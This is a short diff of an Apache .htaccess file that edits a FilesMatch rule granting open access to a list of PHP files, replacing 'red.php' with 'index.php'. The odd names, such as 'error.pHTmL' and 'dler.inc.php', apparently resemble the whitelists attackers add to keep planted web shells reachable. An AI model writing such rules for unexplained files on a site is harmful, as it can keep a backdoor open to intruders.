@@ -9,7 +9,7 @@ Order allow,deny
 Allow from all
 </FilesMatch>
 
-<FilesMatch '^(Handler.inc.php|error.pHTmL|red.php|core.php|ListPanel.inc.php|dler.inc.php|Handler.inc.php)$'>
+<FilesMatch '^(Handler.inc.php|error.pHTmL|index.php|core.php|ListPanel.inc.php|dler.inc.php|Handler.inc.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
